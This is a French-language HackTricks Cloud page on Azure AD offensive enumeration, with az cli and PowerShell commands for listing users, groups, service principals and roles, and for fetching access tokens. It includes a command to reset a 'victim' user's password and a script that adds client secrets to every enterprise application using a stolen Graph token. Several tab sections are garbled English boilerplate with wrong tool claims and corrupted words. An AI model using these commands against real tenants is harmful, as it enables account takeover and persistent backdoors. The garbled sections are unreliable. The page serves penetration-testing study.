# Az - AzureAD (AAD)

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informations de base

Azure Active Directory (Azure AD) sert de service bas√© sur le cloud de Microsoft pour la gestion des identit√©s et des acc√®s. Il est essentiel pour permettre aux employ√©s de se connecter et d'acc√©der √† des ressources, √† la fois au sein et au-del√† de l'organisation, englobant Microsoft 365, le portail Azure et une multitude d'autres applications SaaS. La conception d'Azure AD se concentre sur la fourniture de services d'identit√© essentiels, comprenant notamment **l'authentification, l'autorisation et la gestion des utilisateurs**.

Les fonctionnalit√©s cl√©s d'Azure AD incluent **l'authentification multi-facteurs** et **l'acc√®s conditionnel**, ainsi qu'une int√©gration transparente avec d'autres services de s√©curit√© Microsoft. Ces fonctionnalit√©s √©l√®vent consid√©rablement la s√©curit√© des identit√©s des utilisateurs et permettent aux organisations de mettre en ≈ìuvre et d'appliquer efficacement leurs politiques d'acc√®s. En tant que composant fondamental de l'√©cosyst√®me de services cloud de Microsoft, Azure AD est essentiel pour la gestion bas√©e sur le cloud des identit√©s des utilisateurs.

## Entit√©s

### √ânum√©ration

Pour cette √©num√©ration, vous pouvez utiliser l'outil [**az cli**](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)**,** le module **PowerShell** [**AzureAD**](https://www.powershellgallery.com/packages/AzureAD/) (ou [**AzureAD Preview**](https://www.powershellgallery.com/packages/AzureADPreview)) et le module [**Az PowerShell**](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps).

{% hint style="success" %}
Sur Linux, vous devrez installer PowerShell Core :
```bash
sudo apt-get update
sudo apt-get install -y wget apt-transport-https software-properties-common

# Ubuntu 20.04
wget -q https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb

# Update repos
sudo apt-get update
sudo add-apt-repository universe

# Install & start powershell
sudo apt-get install -y powershell
pwsh

# Az cli
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```
{% endhint %}

#### **Diff√©rences entre les modules**

* **AzureAD** est un module PowerShell de Microsoft pour **g√©rer Azure AD. Il ne montre pas toutes les propri√©t√©s des objets Azure AD et ne peut pas √™tre utilis√© pour acc√©der aux informations des ressources Azure**.
* **Az PowerShell** est un module pour **g√©rer les ressources Azure** √† partir de la ligne de commande PowerShell.

### **Connexion**

{% tabs %}
{% tab title="az cli" %}
```bash
az login #This will open the browser
az login -u <username> -p <password> #Specify user and password
az login --identity #Use the current machine managed identity (metadata)
az login --identity -u /subscriptions/<subscriptionId>/resourcegroups/myRG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/myID #Login with user managed identity
# Login as service principal
az login --service-principal -u http://azure-cli-2016-08-05-14-31-15 -p VerySecret --tenant contoso.onmicrosoft.com #With password
az login --service-principal -u http://azure-cli-2016-08-05-14-31-15 -p ~/mycertfile.pem --tenant contoso.onmicrosoft.com #With cert

# Request access token (ARM)
az account get-access-token
# Request access token for different resource. Supported tokens: aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
az account get-access-token --resource-type aad-graph

# If you want to configure some defaults
az configure

# Get user logged-in already
az ad signed-in-user show

# Help
az find "vm" # Find vm commands
az vm -h # Get subdomains
az ad user list --query-examples # Get examples
```
{% endtab %}

{% tab title="Azure AD" %}
{% code overflow="wrap" %}
```powershell
Connect-AzureAD #Open browser
# Using credentials
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds

# Using tokens
## AzureAD cannot request tokens, but can use AADGraph and MSGraph tokens to connect
Connect-AzureAD -AccountId test@corp.onmicrosoft.com -AadAccessToken $token
```
{% endcode %}
{% endtab %}

{% tab title="Az PowerShell" %}
```powershell
Connect-AzAccount #Open browser
# Using credentials
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@corp.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds

# Get Access Token
(Get-AzAccessToken).Token
# Request access token to other endpoints: AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, MSGraph, OperationalInsights, ResourceManager, Storage, Synapse
Get-AzAccessToken -ResourceTypeName MSGraph
(Get-AzAccessToken -Resource "https://graph.microsoft.com").Token

# Conenct with access token
Connect-AzAccount -AccountId test@corp.onmicrosoft.com -AccessToken $token
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId <ACCOUNT-ID>
## The -AccessToken is from management.azure.com

# Connect with Service principal/enterprise app secret
$password = ConvertTo-SecureString 'KWEFNOIRFIPMWL.--DWPNVFI._EDWWEF_ADF~SODNFBWRBIF' -AsPlainText -Force
$creds = New-Object
System.Management.Automation.PSCredential('2923847f-fca2-a420-df10-a01928bec653', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 29sd87e56-a192-a934-bca3-0398471ab4e7d

#All the Azure AD cmdlets have the format *-AzAD*
Get-Command *azad*
#Cmdlets for other Azure resources have the format *Az*
Get-Command *az*
```
{% endtab %}

{% tab title="Raw PS" %}
{% code overflow="wrap" %}
```powershell
#Using management
$Token = 'eyJ0eXAi..'
# List subscriptions
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method  = 'GET'
Uri     = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# Using graph
Invoke-WebRequest -Uri "https://graph.windows.net/myorganization/users?api-version=1.6" -Headers @{Authorization="Bearer {0}" -f $Token}
```
{% endcode %}
{% endtab %}

{% tab title="Syst√®me d'exploitation brut" %}
{% code overflow="wrap" %}
```bash
# Request tokens to access endpoints
# ARM
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# Vault
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```
{% endcode %}
{% endtab %}
{% endtabs %}

Lorsque vous **vous connectez** via **CLI** dans Azure avec n'importe quel programme, vous utilisez une **Application Azure** d'un **locataire** qui appartient √† **Microsoft**. Ces Applications, comme celles que vous pouvez cr√©er dans votre compte, **ont un ID client**. Vous **ne pourrez pas tous les voir** dans les **listes d'applications autoris√©es** que vous pouvez voir dans la console, **mais ils sont autoris√©s par d√©faut**.

Par exemple, un **script powershell** qui **s'authentifie** utilise une application avec l'ID client **`1950a258-227b-4e31-a9cf-717495945fc2`**. M√™me si l'application n'appara√Æt pas dans la console, un administrateur syst√®me pourrait **bloquer cette application** afin que les utilisateurs ne puissent pas y acc√©der en utilisant des outils qui se connectent via cette application.

Cependant, il existe **d'autres ID clients** d'applications qui **vous permettront de vous connecter √† Azure** :
```powershell
# The important part is the ClientId, which identifies the application to login inside Azure

$token = Invoke-Authorize -Credential $credential `
-ClientId '1dfb5f98-f363-4b0f-b63a-8d20ada1e62d' `
-Scope 'Files.Read.All openid profile Sites.Read.All User.Read email' `
-Redirect_Uri "https://graphtryit-staging.azurewebsites.net/" `
-Verbose -Debug `
-InformationAction Continue

$token = Invoke-Authorize -Credential $credential `
-ClientId '65611c08-af8c-46fc-ad20-1888eb1b70d9' `
-Scope 'openid profile Sites.Read.All User.Read email' `
-Redirect_Uri "chrome-extension://imjekgehfljppdblckcmjggcoboemlah" `
-Verbose -Debug `
-InformationAction Continue

$token = Invoke-Authorize -Credential $credential `
-ClientId 'd3ce4cf8-6810-442d-b42e-375e14710095' `
-Scope 'openid' `
-Redirect_Uri "https://graphexplorer.azurewebsites.net/" `
-Verbose -Debug `
-InformationAction Continue
```
### Utilisateurs

{% tabs %}
{% tab title="az cli" %}
```bash
# Enumerate users
az ad user list --output table
az ad user list --query "[].userPrincipalName"
# Get info of 1 user
az ad user show --id "test@corp.onmicrosoft.com"
# Search "admin" users
az ad user list --query "[].displayName" | findstr /i "admin"
az ad user list --query "[?contains(displayName,'admin')].displayName"
# Search attributes containing the word "password"
az ad user list | findstr /i "password" | findstr /v "null,"
# All users from AzureAD
az ad user list --query "[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi==null]"
az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
# All users synced from on-prem
az ad user list --query "[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi!=null]"
az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# Get groups where the user is a member
az ad user get-member-groups --id <email>
# Get roles assigned to the user
az role assignment list --include-groups --include-classic-administrators true --assignee <email>
```
{% endtab %}

{% tab title="Azure AD" %}

### Azure AD Enumeration

#### User Enumeration

User enumeration can be performed through the Azure AD login interface. By entering a valid username and observing the response, an attacker can determine if the username is valid or not. This can be automated using tools like `enum4linux`, `ldapsearch`, or custom scripts.

#### Group Enumeration

Group enumeration involves identifying Azure AD groups and their members. This can be done using tools like `Azure AD PowerShell module`, `Microsoft Graph API`, or by querying the Azure AD Graph API directly.

#### Device Enumeration

Device enumeration focuses on identifying devices registered in Azure AD. This can be achieved by querying the Azure AD Graph API or using tools like `PowerShell scripts` or `Microsoft Graph API`.

#### Application Enumeration

Application enumeration involves identifying applications registered in Azure AD. This can be done through the Azure portal, `Azure AD PowerShell module`, or by querying the Azure AD Graph API.

#### Service Principal Enumeration

Service principals represent the application in Azure AD. Enumeration of service principals can be done using tools like `Azure AD PowerShell module`, `Microsoft Graph API`, or by querying the Azure AD Graph API directly.

#### Tenant Enumeration

Tenant enumeration involves gathering information about the Azure AD tenant. This can include details such as tenant ID, domain name, verified domains, and more. Enumeration can be performed using tools like `Azure AD PowerShell module`, `Microsoft Graph API`, or by querying the Azure AD Graph API.

### Azure AD Exploitation

#### Password Spraying

Password spraying is a common technique used to attempt a single password against multiple usernames. This can be effective in Azure AD environments where weak passwords are prevalent. Tools like `CrackMapExec`, `Spray`, or custom scripts can be used for password spraying attacks.

#### Brute Force Attacks

Brute force attacks involve systematically checking all possible passwords until the correct one is found. In Azure AD environments, this can be used against user accounts with weak passwords. Tools like `Hydra`, `Medusa`, or custom scripts can be utilized for brute force attacks.

#### Phishing Attacks

Phishing attacks can be used to trick users into revealing their credentials. This can be done through email, fake login pages, or other social engineering techniques. Once credentials are obtained, attackers can access Azure AD resources using the compromised accounts.

#### Token Impersonation

Token impersonation involves stealing or forging authentication tokens to gain unauthorized access to Azure AD resources. Attackers can use tools like `Impacket`, `Rubeus`, or custom scripts to perform token impersonation attacks.

#### Password Hash Capture

Capturing password hashes can allow attackers to crack passwords offline. In Azure AD environments, password hashes can be captured using tools like `Mimikatz`, `Responder`, or by dumping LSASS memory.

#### Privilege Escalation

Privilege escalation involves gaining higher levels of access within Azure AD. This can be achieved through misconfigurations, vulnerabilities, or by exploiting weak permissions. Tools like `BloodHound`, `PowerUp`, or manual enumeration can be used for privilege escalation in Azure AD environments.

{% endtab %}
```powershell
# Enumerate Users
Get-AzureADUser -All $true
Get-AzureADUser -All $true | select UserPrincipalName
# Get info of 1 user
Get-AzureADUser -ObjectId test@corp.onmicrosoft.com | fl
# Search "admin" users
Get-AzureADUser -SearchString "admin" #Search admin at the begining of DisplayName or userPrincipalName
Get-AzureADUser -All $true |?{$_.Displayname -match "admin"} #Search "admin" word in DisplayName
# Get all attributes of a user
Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com|%{$_.PSObject.Properties.Name}
# Search attributes containing the word "password"
Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
# All users from AzureAD# All users from AzureAD
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# All users synced from on-prem
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
# Objects created by a/any user
Get-AzureADUser [-ObjectId <email>] | Get-AzureADUserCreatedObject
# Devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Objects owned by a specific user
Get-AzureADUserOwnedObject -ObjectId test@corp.onmicrosoft.com
# Get groups & roles where the user is a member
Get-AzureADUserMembership -ObjectId 'test@corp.onmicrosoft.com'
# Get devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Get devices registered by a user
Get-AzureADUserRegisteredDevice -ObjectId test@defcorphq.onmicrosoft.com
# Apps where a user has a role (role not shown)
Get-AzureADUser -ObjectId roygcain@defcorphq.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl *
# Get Administrative Units of a user
$userObj = Get-AzureADUser -Filter "UserPrincipalName eq 'bill@example.com'"
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -Id $_.Id | where { $_.Id -eq $userObj.ObjectId } }
```
{% endtab %}

{% tab title="Az PowerShell" %} 

### Gestion des r√¥les Azure AD

#### Lister les r√¥les disponibles

Pour lister les r√¥les disponibles dans Azure AD, vous pouvez utiliser la commande suivante :

```plaintext
Get-AzureADDirectoryRole
```

Cette commande vous renverra la liste des r√¥les disponibles avec leurs noms et descriptions.

#### Assigner un r√¥le √† un utilisateur

Pour assigner un r√¥le sp√©cifique √† un utilisateur dans Azure AD, vous pouvez utiliser la commande suivante :

```plaintext
Add-AzureADDirectoryRoleMember -ObjectId <roleObjectId> -RefObjectId <userObjectId>
```

Assurez-vous de remplacer `<roleObjectId>` par l'ID du r√¥le auquel vous souhaitez ajouter l'utilisateur et `<userObjectId>` par l'ID de l'utilisateur auquel vous souhaitez assigner le r√¥le.

#### Retirer un r√¥le d'un utilisateur

Pour retirer un r√¥le d'un utilisateur dans Azure AD, vous pouvez utiliser la commande suivante :

```plaintext
Remove-AzureADDirectoryRoleMember -ObjectId <roleObjectId> -RefObjectId <userObjectId>
```

Assurez-vous de remplacer `<roleObjectId>` par l'ID du r√¥le que vous souhaitez retirer de l'utilisateur et `<userObjectId>` par l'ID de l'utilisateur dont vous souhaitez retirer le r√¥le.

{% endtab %}
```powershell
# Enumerate users
Get-AzADUser
# Get details of a user
Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
# Search user by string
Get-AzADUser -SearchString "admin" #Search at the beginnig of DisplayName
Get-AzADUser | ?{$_.Displayname -match "admin"}
# Get roles assigned to a user
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
```
{% endtab %}
{% endtabs %}

#### Changer le mot de passe de l'utilisateur

{% code overflow="wrap" %}
```powershell
$password = "ThisIsTheNewPassword.!123" | ConvertTo- SecureString -AsPlainText ‚ÄìForce

(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "victim@corp.onmicrosoft.com"}).ObjectId | Set- AzureADUserPassword -Password $password ‚ÄìVerbose
```
{% endcode %}

### Strat√©gies MFA et d'acc√®s conditionnel

Il est fortement recommand√© d'ajouter MFA √† chaque utilisateur, cependant, certaines entreprises ne le mettront pas en place ou pourraient le configurer avec un Acc√®s conditionnel : L'utilisateur sera **exig√© MFA s'il** se connecte depuis un emplacement sp√©cifique, un navigateur ou **une certaine condition**. Ces politiques, si elles ne sont pas configur√©es correctement, pourraient √™tre sujettes √† des **contournements**. V√©rifiez :

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

### Groupes

{% tabs %}
{% tab title="az cli" %}
```powershell
# Enumerate groups
az ad group list
az ad group list --query "[].[displayName]" -o table
# Get info of 1 group
az ad group show --group <group>
# Get "admin" groups
az ad group list --query "[].displayName" | findstr /i "admin"
az ad group list --query "[?contains(displayName,'admin')].displayName"
# All groups from AzureAD
az ad group list --query "[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi==null]"
az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
# All groups synced from on-prem
az ad group list --query "[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi!=null]"
az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# Get members of group
az ad group member list --group <group> --query "[].userPrincipalName" -o table
# Check if member of group
az ad group member check --group "VM Admins" --member-id <id>
# Get which groups a group is member of
az ad group get-member-groups -g "VM Admins"
# Get Apps where a group has a role (role not shown)
Get-AzureADGroup -ObjectId <id> | Get-AzureADGroupAppRoleAssignment | fl *
```
{% endtab %}

{% tab title="Azure AD" %}
Azure AD (Azure Active Directory) est un service d'annuaire bas√© sur le cloud de Microsoft, qui fournit l'authentification et l'autorisation pour les utilisateurs et les applications. Il est essentiel de comprendre la s√©curit√© d'Azure AD lors de l'√©valuation de la s√©curit√© globale d'un environnement Azure.
```powershell
# Enumerate Groups
Get-AzureADGroup -All $true
# Get info of 1 group
Get-AzADGroup -DisplayName <resource_group_name> | fl
# Get "admin" groups
Get-AzureADGroup -SearchString "admin" | fl #Groups starting by "admin"
Get-AzureADGroup -All $true |?{$_.Displayname -match "admin"} #Groups with the word "admin"
# Get groups allowing dynamic membership
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
# All groups that are from Azure AD
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# All groups that are synced from on-prem (note that security groups are not synced)
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
# Get members of a group
Get-AzureADGroupMember -ObjectId <group_id>
# Get roles of group
Get-AzureADMSGroup -SearchString "Contoso_Helpdesk_Administrators" #Get group id
Get-AzureADMSRoleAssignment -Filter "principalId eq '69584002-b4d1-4055-9c94-320542efd653'"
# Get Administrative Units of a group
$groupObj = Get-AzureADGroup -Filter "displayname eq 'TestGroup'"
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -Id $_.Id | where {$_.Id -eq $groupObj.ObjectId} }
```
{% endtab %}

{% tab title="Az PowerShell" %} 

### Gestion des r√¥les Azure AD

#### Lister les membres d'un r√¥le

Pour lister les membres d'un r√¥le Azure AD, vous pouvez utiliser la commande suivante :

```plaintext
Get-AzureADDirectoryRoleMember -ObjectId <ObjectID>
```

Assurez-vous de remplacer `<ObjectID>` par l'ID de l'objet du r√¥le Azure AD dont vous souhaitez lister les membres.

#### Ajouter un membre √† un r√¥le

Pour aj leter un membre √† un r√¥le Azure AD, vous pouvez utiliser la commande suivante :

```plaintext
Add-AzureADDirectoryRoleMember -ObjectId <ObjectID> -RefObjectId <MemberObjectID>
```

Assurez-vous de remplacer `<ObjectID>` par l'ID de l'objet du r√¥le Azure AD auquel vous souhaitez ajouter un membre, et `<MemberObjectID>` par l'ID de l'objet du membre que vous souhaitez ajouter.

#### Supprimer un membre d'un r√¥le

Pour supprimer un membre d'un r√¥le Azure AD, vous pouvez utiliser la commande suivante :

```plaintext
Remove-AzureADDirectoryRoleMember -ObjectId <ObjectID> -MemberId <MemberObjectID>
```

Assurez-vous de remplacer `<ObjectID>` par l'ID de l'objet du r√¥le Azure AD duquel vous souhaitez supprimer un membre, et `<MemberObjectID>` par l'ID de l'objet du membre que vous souhaitez supprimer.

{% endtab %}
```powershell
# Get all groups
Get-AzADGroup
# Get details of a group
Get-AzADGroup -ObjectId <id>
# Search group by string
Get-AzADGroup -SearchString "admin" | fl * #Search at the beginnig of DisplayName
Get-AzADGroup |?{$_.Displayname -match "admin"}
# Get members of group
Get-AzADGroupMember -GroupDisplayName <resource_group_name>
# Get roles of group
Get-AzRoleAssignment -ResourceGroupName <resource_group_name>
```
{% endtab %}
{% endtabs %}

#### Ajouter un utilisateur √† un groupe

Les propri√©taires du groupe peuvent ajouter de nouveaux utilisateurs au groupe

{% code overflow="wrap" %}
```powershell
Add-AzureADGroupMember -ObjectId <group_id> -RefObjectId <user_id> -Verbose
```
{% endcode %}

{% hint style="warning" %}
Les groupes peuvent √™tre dynamiques, ce qui signifie essentiellement que **si un utilisateur remplit certaines conditions, il sera ajout√© √† un groupe**. Bien s√ªr, si les conditions sont bas√©es sur des **attributs** qu'un **utilisateur** peut **contr√¥ler**, il pourrait abuser de cette fonctionnalit√© pour **acc√©der √† d'autres groupes**.\
Consultez comment abuser des groupes dynamiques sur la page suivante :
{% endhint %}

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

### Principaux de service / Applications d'entreprise

{% hint style="info" %}
Notez que le **Principal de service** dans la terminologie PowerShell **est appel√©** **Applications d'entreprise** dans le portail Azure (web).
{% endhint %}

{% tabs %}
{% tab title="az cli" %}
```bash
# Get Service Principals
az ad sp list --all
az ad sp list --all --query "[].[displayName]" -o table
# Get details of one SP
az ad sp show --id 00000000-0000-0000-0000-000000000000
# Search SP by string
az ad sp list --all --query "[?contains(displayName,'app')].displayName"
# Get owner of service principal
az ad sp owner list --id <id> --query "[].[displayName]" -o table
# Get service principals owned by the current user
az ad sp list --show-mine
# List apps that have password credentials
az ad sp list --all --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad sp list -all --query "[?keyCredentials != null].displayName"
```
{% endtab %}

{% tab title="Azure AD" %}

## Azure AD Enumeration

### User Enumeration

To enumerate users in Azure AD, you can use tools like **Azure AD Connect** or **Azure AD Graph API**. These tools can help you gather information about users, such as usernames, email addresses, and group memberships.

#### Using Azure AD Connect

Azure AD Connect is a tool provided by Microsoft to synchronize on-premises directories with Azure AD. By querying the Azure AD Connect server, you can retrieve information about users in the Azure AD environment.

#### Using Azure AD Graph API

Azure AD Graph API allows you to interact with Azure AD by sending HTTP requests. You can use this API to query user information, suchjson as user attributes and group memberships.

### Group Enumeration

To enumerate groups in Azure AD, you can again use tools like **Azure AD Connect** or **Azure AD Graph API**. These tools can help you retrieve information about groups in the Azure AD environment, such as group names, descriptions, and members.

#### Using Azure AD Connect

Similar to user enumeration, Azure AD Connect can also be used to enumerate groups in Azure AD. By querying the Azure AD Connect server, you can gather information about the groups present in the Azure AD environment.

#### Using Azure AD Graph API

Just like with user enumeration, Azure AD Graph API can be utilized to enumerate groups in Azure AD. By making appropriate HTTP requests to the Graph API, you can retrieve details about the groups in the Azure AD environment.

{% endtab %}
```powershell
# Get Service Principals
Get-AzureADServicePrincipal -All $true
# Get details about a SP
Get-AzureADServicePrincipal -ObjectId <id> | fl *
# Get SP by string name or Id
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"} | fl
Get-AzureADServicePrincipal -All $true | ?{$_.AppId -match "103947652-1234-5834-103846517389"}
# Get owner of SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalOwner |fl *
# Get objects owned by a SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalOwnedObject
# Get objects created by a SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalCreatedObject
# Get groups where the SP is a member
Get-AzureADServicePrincipal | Get-AzureADServicePrincipalMembership
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalMembership |fl *
```
{% endtab %}

{% tab title="Az PowerShell" %} 

### Gestion des groupes Azure AD

#### Recherche de groupes Azure AD

Pour rechercher des groupes Azure AD, vous pouvez utiliser la commande suivante :

```plaintext
Get-AzADGroup -DisplayName "nom_du_groupe"
```

Assurez-vous de remplacer `"nom_du_groupe"` par le nom r√©el du groupe que vous recherchez.

#### Cr√©ation d'un nouveau groupe Azure AD

Pour cr√©er un nouveau groupe Azure AD, vous pouvez utiliser la commande suivante :

```plaintext
New-AzADGroup -DisplayName "nom_du_groupe" -MailNickname "alias_email" -MailEnabled $true
```

Assurez-vous de remplacer `"nom_du_groupe"` par le nom souhait√© pour le groupe et `"alias_email"` par l'alias email que vous souhaitez utiliser.

#### Suppression d'un groupe Azure AD

Pour supprimer un groupe Azure AD, vous pouvez utiliser la commande suivante :

```plaintext
Remove-AzADGroup -ObjectId "ID_du_groupe"
```

Assurez-vous de remplacer `"ID_du_groupe"` par l'ID r√©el du groupe que vous souhaitez supprimer.

{% endtab %}
```powershell
# Get SPs
Get-AzADServicePrincipal
# Get info of 1 SP
Get-AzADServicePrincipal -ObjectId <id>
# Search SP by string
Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"}
# Get roles of a SP
Get-AzRoleAssignment -ServicePrincipalName <String>
```
{% endtab %}

{% tab title="Raw" %}

## Azure AD Enumeration

### User Enumeration

User enumeration can be performed through the Azure AD Graph API. By making requests to the `/users` endpoint, an attacker can gather information about users in the Azure AD tenant.

#### Example Request:

```plaintext
GET https://graph.windows.net/myorganization/users?api-version=1.6
Authorization: Bearer <access_token>
```

### Group Enumeration

Group enumeration can also be done using the Azure AD Graph API. By querying the `/groups` endpoint, an attacker can retrieve information about groups in the Azure AD tenant.

#### Example Request:

```plaintext
GET https://graph.windows.net/myorganization/groups?api-version=1.6
Authorization: Bearer <access_token>
```

### Application Enumeration

Similarly, application enumeration is possible through the Azure AD Graph API. By sending requests to the `/servicePrincipals` endpoint, an attacker can enumerate applications registered in the Azure AD tenant.

#### Example Request:

```plaintext
GET https://graph.windows.net/myorganization/servicePrjsoncipals?api-version=1.6
Authorization: Bearer <access_token>
```

### Device Enumeration

Device enumeration can be carried out by querying the `/devices` endpoint using the Azure AD Graph API. This allows an attacker to gather information about devices registered in the Azure AD tenant.

#### Example Request:

```plaintext
GET https://graph.windows.net/myorganization/devices?api-version=1.6
Authorization: BBearer <access_token>
```

{% endtab %}
```powershell
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method  = 'GET'
Uri     = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
Le propri√©taire d'un Principal de service peut changer son mot de passe.
{% endhint %}

<details>

<summary>Listez et essayez d'ajouter un secret client sur chaque application d'entreprise</summary>
```powershell
# Just call Add-AzADAppSecret
Function Add-AzADAppSecret
{
<#
.SYNOPSIS
Add client secret to the applications.

.PARAMETER GraphToken
Pass the Graph API Token

.EXAMPLE
PS C:\> Add-AzADAppSecret -GraphToken 'eyJ0eX..'

.LINK
https://docs.microsoft.com/en-us/graph/api/application-list?view=graph-rest-1.0&tabs=http
https://docs.microsoft.com/en-us/graph/api/application-addpassword?view=graph-rest-1.0&tabs=http
#>

[CmdletBinding()]
param(
[Parameter(Mandatory=$True)]
[String]
$GraphToken = $null
)

$AppList = $null
$AppPassword = $null

# List All the Applications

$Params = @{
"URI"     = "https://graph.microsoft.com/v1.0/applications"
"Method"  = "GET"
"Headers" = @{
"Content-Type"  = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}

try
{
$AppList = Invoke-RestMethod @Params -UseBasicParsing
}
catch
{
}

# Add Password in the Application

if($AppList -ne $null)
{
[System.Collections.ArrayList]$Details = @()

foreach($App in $AppList.value)
{
$ID = $App.ID
$psobj = New-Object PSObject

$Params = @{
"URI"     = "https://graph.microsoft.com/v1.0/applications/$ID/addPassword"
"Method"  = "POST"
"Headers" = @{
"Content-Type"  = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}

$Body = @{
"passwordCredential"= @{
"displayName" = "Password"
}
}

try
{
$AppPassword = Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)
Add-Member -InputObject $psobj -NotePropertyName "Object ID" -NotePropertyValue $ID
Add-Member -InputObject $psobj -NotePropertyName "App ID" -NotePropertyValue $App.appId
Add-Member -InputObject $psobj -NotePropertyName "App Name" -NotePropertyValue $App.displayName
Add-Member -InputObject $psobj -NotePropertyName "Key ID" -NotePropertyValue $AppPassword.keyId
Add-Member -InputObject $psobj -NotePropertyName "Secret" -NotePropertyValue $AppPassword.secretText
$Details.Add($psobj) | Out-Null
}
catch
{
Write-Output "Failed to add new client secret to '$($App.displayName)' Application."
}
}
if($Details -ne $null)
{
Write-Output ""
Write-Output "Client secret added to : "
Write-Output $Details | fl *
}
}
else
{
Write-Output "Failed to Enumerate the Applications."
}
}
```
</details>

### R√¥les

{% tabs %}
{% tab title="az cli" %}
```bash
# Get roles
az role definition list
# Get assigned roles
az role assignment list --all --query "[].roleDefinitionName"
az role assignment list --all | jq '.[] | .roleDefinitionName,.scope'
# Get info of 1 role
az role definition list --name "AzureML Registry User"
# Get only custom roles
az role definition list --custom-role-only
# Get only roles assigned to the resource group indicated
az role definition list --resource-group <resource_group>
# Get only roles assigned to the indicated scope
az role definition list --scope <scope>
# Get all the principals a role is assigned to
az role assignment list --all --query "[].{principalName:principalName,principalType:principalType,resourceGroup:resourceGroup,roleDefinitionName:roleDefinitionName}[?roleDefinitionName=='<ROLE_NAME>']"
```
{% endtab %}

{% tab title="Azure AD" %}

